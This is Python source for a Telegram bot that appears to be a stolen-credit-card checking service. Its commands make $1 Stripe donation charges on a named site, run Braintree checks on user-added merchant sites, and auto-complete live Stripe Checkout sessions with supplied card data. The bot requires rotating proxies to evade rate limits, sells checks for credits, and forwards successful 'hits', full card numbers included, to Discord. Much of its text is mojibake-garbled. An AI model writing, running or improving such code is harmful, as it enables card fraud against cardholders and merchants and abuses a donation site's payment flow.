# Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â

@bot.message_handler(func=lambda m: m.text and m.text.strip().lower().startswith("/st "))
@_crash_safe
def cmd_st(message):
    start_time = time.time()
    cid = message.chat.id
    uid = getattr(message.from_user, "id", None)
    _log_cmd(message, "/st", extra=(message.text or "").strip())
    _udata = _get_cached_user_data(uid) if uid else None
    if not uid or _udata is None:
        bot.reply_to(message, "Register first to use the bot. Use /register or press Register on /start.", parse_mode="HTML")
        return
    update_user_activity(uid, username=getattr(message.from_user, 'username', None), first_name=getattr(message.from_user, 'first_name', None))
    if not _HAS_ST:
        bot.reply_to(message, "Ã¢ÂÅ’ Stripe Charge API not available.")
        return
    _is_owner = (uid in OWNER_IDS)
    _has_plan = _user_has_active_plan(uid)
    if not _is_owner and not _has_plan:
        cred = _udata.get("credits", 0)
        if cred is None or cred < CREDITS_PER_CHECK:
            bot.reply_to(message, "Insufficient credits. You need 1 credit per check.", parse_mode="HTML")
            return
    text = (message.text or "").strip()
    rest = text.split(None, 1)[1] if len(text.split(None, 1)) > 1 else ""
    if not rest:
        bot.reply_to(message, "Use: /st cc|mm|yy|cvv")
        return
    rest_clean = rest.replace(" ", "").replace("/", "|").replace(":", "|")
    parts = rest_clean.split("|")
    if len(parts) != 4:
        bot.reply_to(message, "Invalid format. Use: cc|mm|yy|cvv")
        return
    cc_num, mm, yy, cvv = [p.strip() for p in parts]
    if not _re.fullmatch(r'\d{13,19}', cc_num):
        bot.reply_to(message, "Invalid card number (must be 13-19 digits).")
        return
    if not _re.fullmatch(r'(0[1-9]|1[0-2])', mm):
        bot.reply_to(message, "Invalid month (01-12).")
        return
    if not _re.fullmatch(r'\d{2,4}', yy):
        bot.reply_to(message, "Invalid year (2 or 4 digits).")
        return
    if not _re.fullmatch(r'\d{3,4}', cvv):
        bot.reply_to(message, "Invalid CVV (3-4 digits).")
        return
    card_str = "|".join([cc_num, mm, yy, cvv])
    valid, err = _validate_card_format(card_str)
    if not valid:
        bot.reply_to(message, f"Ã¢ÂÅ’ {err}\nNo credits deducted.")
        return
    # Anti-duplicate
    if not _is_owner and not _has_plan and _is_duplicate_card(card_str):
        bot.reply_to(message, "Ã¢Å¡Â Ã¯Â¸Â This card was already checked in the last 5 minutes. Skipped (no credits deducted).")
        return
    if not _is_owner and not _has_plan:
        if not deduct_credits(uid, CREDITS_PER_CHECK):
            bot.reply_to(message, "Insufficient credits.")
            return
    proxies = get_proxies(cid)
    if uid and cid != uid and not proxies:
        proxies = get_proxies(uid)
    if not proxies:
        bot.reply_to(message, "Ã¢Å¡Â Ã¯Â¸Â <b>Proxies required.</b> Add proxies first using <code>/setproxies</code> to avoid rate limits.", parse_mode="HTML")
        # Refund credit if already deducted
        if not _is_owner and not _has_plan:
            coll = _users_coll()
            if coll is not None:
                coll.update_one({"_id": uid}, {"$inc": {"credits": CREDITS_PER_CHECK}})
                _invalidate_user_cache(uid)
        return
    proxy = None
    p = _pick_proxy(proxies)
    if p:
        proxy = {"http": p, "https": p}
    print("[DEBUG] /st: Sending checking message...")
    status_msg = bot.reply_to(message, "Ã¢ÂÂ³ " + _to_bold_sans("CHECKING CARD (STRIPE CHARGE)..."), parse_mode="HTML")
    try:
        result = _st_check_sync(card_str, proxy=proxy)
        if result is None:
            result = {"status": "Error", "message": "No response from gateway", "is_approved": False}
    except Exception as e:
        err_text = str(e)[:300]
        bot.edit_message_text(f"Ã¢ÂÅ’ Error: {err_text}", cid, status_msg.message_id)
        if not _is_owner and not _has_plan:
            coll = _users_coll()
            if coll is not None:
                coll.update_one({"_id": uid}, {"$inc": {"credits": CREDITS_PER_CHECK}})
                _invalidate_user_cache(uid)
        return
    elapsed = time.time() - start_time
    status = result.get("status", "Error")
    msg_text = result.get("message", "")
    _mongo_inc = {"total_checks": 1}
    if status == "Error" and not _is_owner and not _has_plan:
        _mongo_inc["credits"] = CREDITS_PER_CHECK
    coll = _users_coll()
    if coll is not None:
        coll.update_one({"_id": uid}, {"$inc": _mongo_inc})
        _invalidate_user_cache(uid)

    # Format output Ã¢â‚¬â€ same style as /sh
    if status == "Charged":
        _header = "<b>Ã°ÂËœÂ¾Ã°Ââ„¢Æ’Ã°ÂËœÂ¼Ã°Ââ„¢ÂÃ°Ââ„¢â€šÃ°Ââ„¢â‚¬Ã°ÂËœÂ¿</b> Ã°Å¸Â§Â¾"
        _resp_text = "Charged $1.00 Ã°Å¸â€ºâ€™"
        try:
            _discord_charged(message, card_str, "forechrist.com", "Donation", "$1.00", "single", status="Charged", response="CHARGED")
        except Exception:
            pass
        try:
            _send_hit_to_chat(message, "CHARGED", "$1.00", "Donation", response="CHARGED $1.00", gateway="Stripe Charge")
        except Exception:
            pass
        increment_total_hits(uid, 1)
    elif status == "Approved" or (status == "Declined" and result.get("is_approved")):
        _header = "<b>Ã°ÂËœÂ¼Ã°Ââ„¢â€¹Ã°Ââ„¢â€¹Ã°Ââ„¢ÂÃ°Ââ„¢Å Ã°Ââ„¢â€˜Ã°Ââ„¢â‚¬Ã°ÂËœÂ¿</b> Ã¢Å“â€¦"
        _resp_text = _esc(msg_text[:100] or "Approved")
        increment_total_hits(uid, 1)
    elif status == "Declined":
        _header = "<b>Ã°ÂËœÂ¿Ã°Ââ„¢â‚¬Ã°ÂËœÂ¾Ã°Ââ„¢â€¡Ã°Ââ„¢â€žÃ°Ââ„¢â€°Ã°Ââ„¢â‚¬Ã°ÂËœÂ¿</b> Ã¢ÂÅ’"
        _resp_text = _esc(msg_text[:100] or "Declined")
    else:
        _header = "<b>Ã°Ââ„¢â‚¬Ã°Ââ„¢ÂÃ°Ââ„¢ÂÃ°Ââ„¢Å Ã°Ââ„¢Â</b> Ã¢Å¡Â Ã¯Â¸Â"
        _resp_text = _esc(msg_text[:100] or status)

    out  = f"{_header}\n\n"
    out += f"<b>Ã°Ââ€”â€“Ã°Ââ€”â€“</b> Ã¢â€¡Â¾ <code>{card_str}</code>\n"
    out += f"<b>Ã°Ââ€”Å¡Ã°Ââ€”Â®Ã°ÂËœÂÃ°Ââ€”Â²Ã°ÂËœâ€žÃ°Ââ€”Â®Ã°ÂËœâ€ </b> Ã¢â€¡Â¾ Stripe Charge\n"
    out += f"<b>Ã°Ââ€”Â¥Ã°Ââ€”Â²Ã°ÂËœâ‚¬Ã°Ââ€”Â½Ã°Ââ€”Â¼Ã°Ââ€”Â»Ã°ÂËœâ‚¬Ã°Ââ€”Â²</b> Ã¢â€¡Â¾ {_resp_text}\n"
    if status == "Error" and not _is_owner and not _has_plan:
        out += f"<b>Ã°Ââ€”Â¡Ã°Ââ€”Â¼Ã°ÂËœÂÃ°Ââ€”Â²</b> Ã¢â€¡Â¾ Credit refunded Ã°Å¸â€™Â°\n"
    # BIN info
    try:
        bi = _lookup_bin(cc_num)
        if bi:
            out += f"\n<b>Ã°Ââ€”â€¢Ã°Ââ€”Å“Ã°Ââ€”Â¡ Ã°Ââ€”Å“Ã°Ââ€”Â»Ã°Ââ€”Â³Ã°Ââ€”Â¼:</b> {_esc(bi['scheme'])} - {_esc(bi['type'])} - {_esc(bi.get('brand') or bi['type'])}\n"
            out += f"<b>Ã°Ââ€”â€¢Ã°Ââ€”Â®Ã°Ââ€”Â»Ã°Ââ€”Â¸:</b> {_esc(bi['bank'])}\n"
            out += f"<b>Ã°Ââ€”â€“Ã°Ââ€”Â¼Ã°ÂËœâ€šÃ°Ââ€”Â»Ã°ÂËœÂÃ°Ââ€”Â¿Ã°ÂËœâ€ :</b> {_esc(bi['country_name'])} {bi['emoji']}\n"
    except Exception:
        pass
    try:
        bot.edit_message_text(out, cid, status_msg.message_id, parse_mode="HTML")
    except Exception:
        try:
            bot.edit_message_text(f"Status: {status}\nResponse: {msg_text}\nCard: {card_str}", cid, status_msg.message_id)
        except Exception:
            pass
    _mark_card_checked(card_str)
    _bg_fire(_log_check_result, uid, cc_num[-4:], "StripeCharge", status, msg_text, "forechrist.com")


# Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
#  /bt Ã¢â‚¬â€ Braintree Single Card Check
# Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â

def _run_bt_sync(site_url, card_str, proxy_url=None):
    """Run one Braintree check on the shared event loop."""
    try:
        from braintreeapi import run_braintree_check_async
        fut = asyncio.run_coroutine_threadsafe(
            run_braintree_check_async(site_url, card_str, proxy_url=proxy_url, verbose=DEBUG),
            _shared_loop,
        )
        return fut.result(timeout=90)
    except Exception as e:
        return {"status": "Error", "message": str(e)[:200], "error_code": "BT_EXCEPTION"}


@bot.message_handler(func=lambda m: m.text and m.text.strip().lower().startswith("/bt "))
@_crash_safe
def cmd_bt(message):
    start_time = time.time()
    cid = message.chat.id
    uid = getattr(message.from_user, "id", None)
    _stop_flags.pop(cid, None)
    _log_cmd(message, "/bt", extra=(message.text or "").strip())
    _udata = _get_cached_user_data(uid) if uid else None
    if not uid or _udata is None:
        bot.reply_to(message, "Register first to use the bot. Use /register or press Register on /start.", parse_mode="HTML")
        return
    update_user_activity(uid, username=getattr(message.from_user, 'username', None), first_name=getattr(message.from_user, 'first_name', None))
    _is_owner = (uid in OWNER_IDS)
    _has_plan = _user_has_active_plan(uid)
    if not _is_owner and not _has_plan:
        cred = _udata.get("credits", 0)
        if cred is None or cred < CREDITS_PER_CHECK:
            bot.reply_to(message, "Insufficient credits. You need 1 credit per check.", parse_mode="HTML")
            return
    text = (message.text or "").strip()
    rest = text.replace("/bt", "").strip()
    if not rest:
        bot.reply_to(message, "Use: /bt cc|mm|yy|cvv")
        return
    rest_clean = rest.replace(" ", "").replace("/", "|").replace(":", "|")
    parts = rest_clean.split("|")
    if len(parts) != 4:
        bot.reply_to(message, "Invalid format. Use: cc|mm|yy|cvv")
        return
    cc_num, mm, yy, cvv = [p.strip() for p in parts]
    if not _re.fullmatch(r'\d{13,19}', cc_num):
        bot.reply_to(message, "Invalid card number (must be 13-19 digits).")
        return
    if not _re.fullmatch(r'(0[1-9]|1[0-2])', mm):
        bot.reply_to(message, "Invalid month (01-12).")
        return
    if not _re.fullmatch(r'\d{2,4}', yy):
        bot.reply_to(message, "Invalid year (2 or 4 digits).")
        return
    if not _re.fullmatch(r'\d{3,4}', cvv):
        bot.reply_to(message, "Invalid CVV (3-4 digits).")
        return
    # Luhn pre-validation Ã¢â‚¬â€ reject invalid cards before deducting credits
    card_str = "|".join([cc_num, mm, yy, cvv])
    valid, err = _validate_card_format(card_str)
    if not valid:
        bot.reply_to(message, f"Ã¢ÂÅ’ {err}\nNo credits deducted.")
        return
    bt_sites = get_bt_sites(cid)
    proxies = get_proxies(cid)
    if uid and cid != uid:
        if not bt_sites:
            bt_sites = get_bt_sites(uid)
        if not proxies:
            proxies = get_proxies(uid)
    if not bt_sites:
        bot.reply_to(message, "No BT sites. <code>/btsite</code> to add.", parse_mode="HTML")
        return
    if not proxies:
        bot.reply_to(message, "Ã¢Å¡Â Ã¯Â¸Â <b>Proxies required.</b> Add proxies first using <code>/setproxies</code>.", parse_mode="HTML")
        return
    if not _is_owner and not _has_plan:
        if not deduct_credits(uid, CREDITS_PER_CHECK):
            bot.reply_to(message, "Insufficient credits.")
            return
    site = _pick_site_rr(bt_sites)
    proxy = _pick_proxy(proxies)  # Rotate proxy for each check
    card_str = "|".join(parts)
    if not _is_owner and not _has_plan and _is_duplicate_card(card_str):
        bot.reply_to(message, "Ã¢Å¡Â Ã¯Â¸Â This card was already checked in the last 5 minutes. Skipped (no credits deducted).")
        coll = _users_coll()
        if coll is not None:
            coll.update_one({"_id": uid}, {"$inc": {"credits": CREDITS_PER_CHECK}})
            _invalidate_user_cache(uid)
        return
    status_msg = bot.reply_to(message, "Ã¢ÂÂ³ " + _to_bold_sans("CHECKING CARD (BRAINTREE)..."), parse_mode="HTML")
    try:
        result = _run_bt_sync(site, card_str, proxy)
        _record_proxy_result(proxy, result)
        _record_site_result(site, result)
    except Exception as e:
        err_text = str(e)[:300]
        bot.edit_message_text(f"Ã¢ÂÅ’ Error: {err_text}", cid, status_msg.message_id)
        if not _is_owner and not _has_plan:
            coll = _users_coll()
            if coll is not None:
                coll.update_one({"_id": uid}, {"$inc": {"credits": CREDITS_PER_CHECK}})
                _invalidate_user_cache(uid)
        return

    elapsed = time.time() - start_time
    status = result.get("status", "Error")
    _mongo_inc = {"total_checks": 1}
    if status == "Error" and not _is_owner and not _has_plan:
        _mongo_inc["credits"] = CREDITS_PER_CHECK
    coll = _users_coll()
    if coll is not None:
        coll.update_one({"_id": uid}, {"$inc": _mongo_inc})
        _invalidate_user_cache(uid)
    msg = result.get("message", "")
    code = result.get("error_code", "")
    site_short = _esc(site.replace("https://", "").replace("http://", "").split("/")[0])

    if status == "Charged":
        _header = "<b>Ã°ÂËœÂ¾Ã°Ââ„¢Æ’Ã°ÂËœÂ¼Ã°Ââ„¢ÂÃ°Ââ„¢â€šÃ°Ââ„¢â‚¬Ã°ÂËœÂ¿</b> Ã°Å¸Â§Â¾"
        _resp_text = "Card Charged Ã°Å¸â€ºâ€™"
        try:
            _discord_charged(message, card_str, site_short, "", "", "single", status="Charged", response="CARD CHARGED")
        except Exception:
            pass
        try:
            _send_hit_to_chat(message, "BT_CHARGED", "", "", response="CARD CHARGED", gateway="Braintree")
        except Exception:
            pass
        increment_total_hits(uid, 1)
    elif status == "Approved":
        _header = "<b>Ã°ÂËœÂ¼Ã°Ââ„¢â€¹Ã°Ââ„¢â€¹Ã°Ââ„¢ÂÃ°Ââ„¢Å Ã°Ââ„¢â€˜Ã°Ââ„¢â‚¬Ã°ÂËœÂ¿</b> Ã¢Å“â€¦"
        _resp_text = _esc(code or msg or "Approved")
        increment_total_hits(uid, 1)
    elif status == "Declined":
        _header = "<b>Ã°ÂËœÂ¿Ã°Ââ„¢â‚¬Ã°ÂËœÂ¾Ã°Ââ„¢â€¡Ã°Ââ„¢â€žÃ°Ââ„¢â€°Ã°Ââ„¢â‚¬Ã°ÂËœÂ¿</b> Ã¢ÂÅ’"
        _resp_text = _esc(code or msg or "Declined")
    else:
        _header = "<b>Ã°Ââ„¢â‚¬Ã°Ââ„¢ÂÃ°Ââ„¢ÂÃ°Ââ„¢Å Ã°Ââ„¢Â</b> Ã¢Å¡Â Ã¯Â¸Â"
        _resp_text = _esc(code or msg or status)

    out  = f"{_header}\n\n"
    out += f"<b>Ã°Ââ€”â€“Ã°Ââ€”â€“</b> Ã¢â€¡Â¾ <code>{card_str}</code>\n"
    out += f"<b>Ã°Ââ€”Å¡Ã°Ââ€”Â®Ã°ÂËœÂÃ°Ââ€”Â²Ã°ÂËœâ€žÃ°Ââ€”Â®Ã°ÂËœâ€ </b> Ã¢â€¡Â¾ Braintree\n"
    out += f"<b>Ã°Ââ€”Â¥Ã°Ââ€”Â²Ã°ÂËœâ‚¬Ã°Ââ€”Â½Ã°Ââ€”Â¼Ã°Ââ€”Â»Ã°ÂËœâ‚¬Ã°Ââ€”Â²</b> Ã¢â€¡Â¾ {_resp_text}\n"
    if status == "Error" and not _is_owner and not _has_plan:
        out += f"<b>Ã°Ââ€”Â¡Ã°Ââ€”Â¼Ã°ÂËœÂÃ°Ââ€”Â²</b> Ã¢â€¡Â¾ Credit refunded Ã°Å¸â€™Â°\n"

    # BIN info
    cc_num = card_str.split("|")[0]
    try:
        bi = _lookup_bin(cc_num)
        if bi:
            out += f"\n<b>Ã°Ââ€”â€¢Ã°Ââ€”Å“Ã°Ââ€”Â¡ Ã°Ââ€”Å“Ã°Ââ€”Â»Ã°Ââ€”Â³Ã°Ââ€”Â¼:</b> {_esc(bi['scheme'])} - {_esc(bi['type'])} - {_esc(bi.get('brand') or bi['type'])}\n"
            out += f"<b>Ã°Ââ€”â€¢Ã°Ââ€”Â®Ã°Ââ€”Â»Ã°Ââ€”Â¸:</b> {_esc(bi['bank'])}\n"
            out += f"<b>Ã°Ââ€”â€“Ã°Ââ€”Â¼Ã°ÂËœâ€šÃ°Ââ€”Â»Ã°ÂËœÂÃ°Ââ€”Â¿Ã°ÂËœâ€ :</b> {_esc(bi['country_name'])} {bi['emoji']}\n"
    except Exception:
        pass

    bot.edit_message_text(out, cid, status_msg.message_id, parse_mode="HTML")
    _mark_card_checked(card_str)
    _bg_fire(_log_check_result, uid, card_str.split("|")[0][-4:], "Braintree", status, code or msg, site)


# Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
#  /ac Ã¢â‚¬â€ Stripe Checkout Auto-Checkout
# Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
AC_MAX_CARDS = 10

@bot.message_handler(commands=["ac"])
@_crash_safe
def cmd_ac(message):
    cid = message.chat.id
    uid = getattr(message.from_user, "id", None)
    _log_cmd(message, "/ac")
    if not uid or not is_registered(uid):
        bot.reply_to(message, "Register first to use the bot. Use /register or press Register on /start.", parse_mode="HTML")
        return
    update_user_activity(uid, username=getattr(message.from_user, 'username', None), first_name=getattr(message.from_user, 'first_name', None))
    sc = _to_bold_sans
    pending_ac_link[cid] = time.time()
    # Clear any stale card pending for this chat
    pending_ac_cards.pop(cid, None)
    txt  = f"<b>{sc('STRIPE AUTO-CHECKOUT')}</b> Ã¢Å¡Â¡\n"
    txt += "Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\n"
    txt += f"Ã¢â€“Â¸ Send a <b>Stripe Checkout</b> link\n"
    txt += f"Ã¢â€“Â¸ Format: <code>https://checkout.stripe.com/c/pay/cs_live_...</code>\n\n"
    txt += f"<i>{sc('WAITING FOR LINK...')}</i>"
    bot.reply_to(message, txt, parse_mode="HTML")


def _handle_ac_link(message):
    """Process a Stripe Checkout link sent after /ac."""
    cid = message.chat.id
    uid = getattr(message.from_user, "id", None)
    pending_ac_link.pop(cid, None)

    url = (message.text or "").strip()
    if "checkout.stripe.com" not in url.lower():
        bot.reply_to(message, "Ã¢ÂÅ’ Not a valid Stripe Checkout URL. Use <code>/ac</code> to try again.", parse_mode="HTML")
        return

    sc = _to_bold_sans
    status_msg = bot.reply_to(message, f"Ã°Å¸â€Â {sc('FETCHING CHECKOUT DATA...')}", parse_mode="HTML")

    # Fetch checkout info via stripeapi (runs on shared async loop)
    try:
        fut = asyncio.run_coroutine_threadsafe(
            fetch_checkout_info(url, proxy_url=None),
            _shared_loop,
        )
        info = fut.result(timeout=50)
    except Exception as e:
        bot.edit_message_text(f"Ã¢ÂÅ’ Error fetching checkout: {_esc(str(e)[:200])}", cid, status_msg.message_id, parse_mode="HTML")
        return

    if not info.get("success"):
        err = info.get("error", "Unknown error")
        bot.edit_message_text(f"Ã¢ÂÅ’ {_esc(err)}", cid, status_msg.message_id, parse_mode="HTML")
        return

    pk = info.get("pk", "")
    cs_id = info.get("cs_id", "")
    amount = info.get("amount", "N/A")
    amount_cents = info.get("amount_cents", 0)
    currency = info.get("currency", "USD")
    product = info.get("product", "N/A")
    merchant = info.get("merchant", "")
    email = info.get("email", "")

    # cs_id is required for the checkout confirm flow
    if not cs_id:
        bot.edit_message_text(
            f"Ã¢ÂÅ’ Could not extract checkout session ID from this link.\n"
            f"<b>PK:</b> <code>{_esc(pk[:20])}...</code>" if pk else "Ã¢ÂÅ’ No data extracted.",
            cid, status_msg.message_id, parse_mode="HTML",
        )
        return

    # Store data for card input phase
    pending_ac_cards[cid] = {
        "pk": pk,
        "cs_id": cs_id,
        "amount": amount,
        "amount_cents": amount_cents,
        "currency": currency,
        "product": product,
        "merchant": merchant,
        "email": email,
        "url": url,
        "uid": uid,
        "ts": time.time(),
        # Intent data
        "pi_id": info.get("pi_id", ""),
        "pi_client_secret": info.get("pi_client_secret", ""),
        "si_id": info.get("si_id", ""),
        "si_client_secret": info.get("si_client_secret", ""),
        "intent_type": info.get("intent_type", ""),
        # Session fields for confirm
        "session_eid": info.get("session_eid", "NA"),
        "email_collection": info.get("email_collection", ""),
        "name_collection": info.get("name_collection", ""),
        "billing_address_collection": info.get("billing_address_collection", ""),
        "mode": info.get("mode", ""),
    }

    # Display checkout info
    pk_short = pk[:12] + "..." + pk[-4:] if len(pk) > 20 else pk
    cs_short = cs_id[:20] + "..." if len(cs_id) > 20 else cs_id
    _cur_symbols = {"USD": "$", "EUR": "Ã¢â€šÂ¬", "GBP": "Ã‚Â£", "INR": "Ã¢â€šÂ¹", "CAD": "CA$", "AUD": "A$", "JPY": "Ã‚Â¥", "BRL": "R$"}
    cur_sym = _cur_symbols.get(currency, "")
    if amount and amount != "N/A":
        # Clean display: remove trailing .00 for whole amounts
        try:
            amt_f = float(amount)
            amt_display = f"{amt_f:.0f}" if amt_f == int(amt_f) else f"{amt_f:.2f}"
        except (ValueError, TypeError):
            amt_display = amount
        amount_str = f"{cur_sym}{amt_display} {currency}" if cur_sym else f"{amt_display} {currency}"
    else:
        amount_str = "N/A"

    txt  = f"<b>{sc('STRIPE CHECKOUT INFO')}</b> Ã¢Å¡Â¡\n"
